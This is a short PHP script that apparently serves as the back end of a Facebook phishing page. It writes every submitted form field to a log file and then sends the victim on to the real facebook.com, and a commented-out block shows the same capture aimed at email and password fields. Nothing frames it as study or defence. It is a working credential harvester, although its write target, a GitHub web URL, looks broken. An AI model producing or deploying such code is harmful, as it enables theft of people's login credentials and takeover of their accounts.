
<?php

header('Location: https://www.facebook.com');
$handle = fopen("https://github.com/harithadushmantha/fb_app/blob/main/log.txt","a");
foreach($_POST as $variable => $value){
    fwrite($handle,$variable);
    fwrite($handle,"=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
    echo($value);
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>
    <!-- $email = $_POST['email'];
    $password = $_POST['password'];
    $data = $password;
    $file = 'file';
    file_put_contents($file, $data .PHP_EOL, FILE_APPEND);
    header('Location: https://www.facebook.com'); -->
